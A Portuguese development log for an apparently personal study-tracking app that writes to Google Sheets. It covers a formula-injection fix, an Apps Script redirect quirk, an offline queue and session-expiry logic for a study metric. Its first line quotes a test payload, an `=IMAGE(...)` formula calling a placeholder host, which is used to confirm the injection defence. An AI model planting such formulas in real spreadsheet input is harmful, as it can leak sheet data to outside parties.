`=IMAGE("http://example.com/vazou")` gravou `#REF!`, ou seja, o Sheets avaliou
a fórmula. O Google chegou a exibir o aviso "formulas are trying to send and
receive data from external parties"; aprovar o acesso teria ligado o vazamento.

Corrigido com "Gerenciar implantações → Versão: Nova versão" (Version 3), que
preserva a URL — o secret e as provas publicadas não precisaram mudar.

Verificado de novo, agora com canário **inerte** (`=1+1`, sem requisição
externa, aprendendo com a linha viva deixada no teste anterior): a célula
guardou o texto literal `=1+1` em vez de avaliar para `2`. Proteção ativa.

Nota operacional: `curl` devolve HTTP 411 nesses POSTs porque segue o redirect
do Apps Script e reemite sem `Content-Length`. O POST original é processado —
a verificação é ler a planilha, não o código de retorno.

## 2026-08-25 — Sessão com prazo de validade

- **Diagnóstico**: as respostas do Marco não chegavam à planilha. Causa: a aba
  rodava a versão da página anterior ao secret, então `TEM_URL` era falso e cada
  linha ia para a fila do `localStorage`. Nada se perdeu — o hard reload drenou
  a fila e as 7 linhas subiram sozinhas. O mecanismo offline fez o trabalho dele,
  só que em silêncio.
- **fix (métrica)**: `sessao_id` não expirava. Uma sessão real ficou com a 1ª
  questão às 20h27 de 24/08 e a 2ª às 13h03 de 25/08 — duas ocasiões de estudo
  contadas como uma. Isso corrói a regra de "3 sessões distintas" da seção 2:
  um tema ruim numa sessão pode ser cansaço, e só ocasiões separadas distinguem
  cansaço de lacuna. Agora a sessão expira após 3 h paradas; `posicao_na_sessao`
  recomeça em 1 e `retomada` volta a `false`, porque a linha abre uma sessão em
  vez de continuar a anterior.
  Verificado contra o cenário real: pausa de 45 min mantém a sessão (pos 3),
  a virada do dia gera id novo (pos 1). O dashboard passa a contar 2 sessões
  onde contava 1.
